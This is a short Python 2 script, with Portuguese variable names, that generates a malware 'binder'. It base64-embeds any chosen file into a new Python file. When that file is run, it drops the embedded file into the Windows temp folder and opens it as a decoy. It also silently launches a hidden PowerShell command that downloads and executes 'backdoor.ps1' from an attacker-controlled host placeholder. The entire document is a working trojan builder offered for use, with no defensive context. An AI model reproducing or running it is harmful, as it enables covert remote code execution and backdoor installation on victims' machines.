import os, base64

arquivo1 = raw_input('Primeiro arquivo: ')
nomeArquivo1 = os.path.basename(arquivo1)

with open(arquivo1, 'rb') as arquivo1Aberto:
    with open('arquivoFinal.py', 'w') as arquivo_gerado:
        arquivo_gerado.write('''import os, base64
def join(conteudoBinario,nomeArquivo):
    if not os.path.exists(os.environ["TEMP"] + "\\\\" + nomeArquivo):
        with open(os.environ["TEMP"]+ "\\\\" + nomeArquivo, "wb") as arquivoTemporario:
            arquivoTemporario.write(conteudoBinario)
    os.startfile(os.environ["TEMP"]+ "\\\\" + nomeArquivo)
    os.popen("powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://IP_do_atacante:8080/backdoor.ps1'))") #1
arquivo1base64 = "%s"
join(base64.b64decode(arquivo1base64), "%s")
''' %(base64.b64encode(arquivo1Aberto.read()), nomeArquivo1))